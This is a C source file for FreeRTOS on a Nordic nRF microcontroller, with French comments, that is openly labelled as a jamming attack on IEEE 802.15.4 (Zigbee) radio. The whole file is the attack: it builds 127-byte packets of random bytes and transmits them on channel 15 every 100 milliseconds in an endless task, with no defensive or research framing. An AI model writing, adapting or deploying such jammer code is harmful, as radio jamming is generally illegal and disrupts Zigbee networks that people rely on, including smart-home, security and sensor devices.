#include "FreeRTOS.h"
#include "task.h"
#include "timers.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include "nrf.h"
#include "nrf_drv_radio802154.h"  // Pour la pile radio IEEE 802.15.4
#include "nrf_log.h"
#include "nrf_log_ctrl.h"
#include "nrf_log_default_backends.h"

#define CHANNEL 15           // Choisir un canal Zigbee spécifique
#define TX_POWER 0xC5        // Puissance d'émission
#define PACKET_LENGTH 127    // Taille du paquet de brouillage
#define SLEEP_TIME_MS 100    // Temps de pause entre l'envoi des paquets (en ms)

// Buffer pour le paquet de brouillage
static uint8_t jamming_packet[PACKET_LENGTH];

// Fonction pour générer un paquet aléatoire
void generate_jamming_packet(uint8_t *packet, size_t length) {
    for (size_t i = 0; i < length; i++) {
        packet[i] = rand() % 256;  // Générer un octet aléatoire
    }
}

// Fonction pour envoyer un paquet de brouillage
void send_jamming_packet(void) {
    // Générer un paquet de brouillage aléatoire
    generate_jamming_packet(jamming_packet, sizeof(jamming_packet));

    // Envoyer le paquet via la pile radio 802.15.4
    nrf_drv_radio802154_tx(jamming_packet, sizeof(jamming_packet));
}

// Task FreeRTOS pour l'attaque de brouillage
void jamming_task(void *pvParameters) {
    while (1) {
        send_jamming_packet();  // Envoyer un paquet de brouillage
        vTaskDelay(pdMS_TO_TICKS(SLEEP_TIME_MS));  // Pause avant l'envoi du prochain paquet
    }
}

int main(void) {
    // Initialisation de FreeRTOS
    nrf_log_init();
    NRF_LOG_DEFAULT_BACKENDS_INIT();
    printf("Démarrage de l'attaque de brouillage...\n");

    // Initialiser la pile radio 802.15.4
    nrf_drv_radio802154_init(NULL);

    // Créer la tâche FreeRTOS pour l'attaque de brouillage
    xTaskCreate(jamming_task, "Brouillage", configMINIMAL_STACK_SIZE, NULL, tskIDLE_PRIORITY + 1, NULL);

    // Démarrer le planificateur FreeRTOS
    vTaskStartScheduler();

    // Le code ne devrait jamais arriver ici si FreeRTOS fonctionne correctement
    while (1) {
        // La boucle principale est vide car tout se passe dans FreeRTOS
    }
}
